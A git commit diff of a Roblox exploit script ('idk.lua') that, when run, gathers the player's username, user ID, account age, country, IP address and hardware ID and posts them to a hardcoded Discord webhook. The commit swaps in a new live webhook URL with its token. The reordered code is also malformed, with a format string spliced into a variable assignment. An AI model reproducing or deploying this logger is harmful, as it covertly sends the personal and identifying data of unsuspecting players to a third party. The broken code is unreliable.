8ac29dd63dbb5ad79e3bd21816adc0b980cf32b7
skiztho <skaibidaitoilet@gmail.com>
2025-07-10 23:46:30 +0300

    Update idk.lua

--- idk.lua
+++ idk.lua
@@ -1,4 +1,15 @@
-local Userid = LocalPlayer.UserId
+
+-- Webhook creation
+local function createWebhookData()
+    local webhookcheck = detectExecutor()
+    return HttpService:JSONEncode({
+        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1306301015347167350/1369302674360504400/uhq5zTcMPM3tOW_fbUz4PayDt_5pkEXdyXXoRWs3XOg.png?ex=681c06bd&is=681ab53d&hm=ad40a611217c209fa2fca81db4848c04923a0558e770aca634497560652c4c5e&",
+        ["content"] = "",
+        ["embeds"] = {{
+            ["author"] = {["name"] = "Lock executed", ["url"] = "https://roblox.com"},
+            ["description"] = string.format(
+                "__[Player Info](https://www.roblox.com/users/%d)__" ..
+                " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s"local Userid = LocalPlayer.UserId
 local DName = LocalPlayer.DisplayName
 local Name = LocalPlayer.Name
 local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
@@ -21,18 +32,7 @@ local function detectExecutor()
         or "Unsupported"
     return executor
 end
-
--- Webhook creation
-local function createWebhookData()
-    local webhookcheck = detectExecutor()
-    return HttpService:JSONEncode({
-        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1306301015347167350/1369302674360504400/uhq5zTcMPM3tOW_fbUz4PayDt_5pkEXdyXXoRWs3XOg.png?ex=681c06bd&is=681ab53d&hm=ad40a611217c209fa2fca81db4848c04923a0558e770aca634497560652c4c5e&",
-        ["content"] = "",
-        ["embeds"] = {{
-            ["author"] = {["name"] = "Lock executed", ["url"] = "https://roblox.com"},
-            ["description"] = string.format(
-                "__[Player Info](https://www.roblox.com/users/%d)__" ..
-                " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
+ ..
                 "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                 "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                 "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
@@ -59,5 +59,5 @@ local function sendWebhook(url, data)
 end
 
 -- Call webhook once at script start
-local webhookUrl = "https://discord.com/api/webhooks/1368973291162697798/AkU4jNAXhWi566PgGQGqh9wEMrw9mFwZ62k9xbhyqxmN9RGpxmBrxzhLnGXNIRRjCxuq"
+local webhookUrl = "https://discord.com/api/webhooks/1392966553204555917/AitvLsZx8J53Pg0fHzD5iBxpCqvsRaFCIGAHj-2y3S1iR1TluVHPKIaN1kh0MGsD_13z"
 sendWebhook(webhookUrl, createWebhookData())
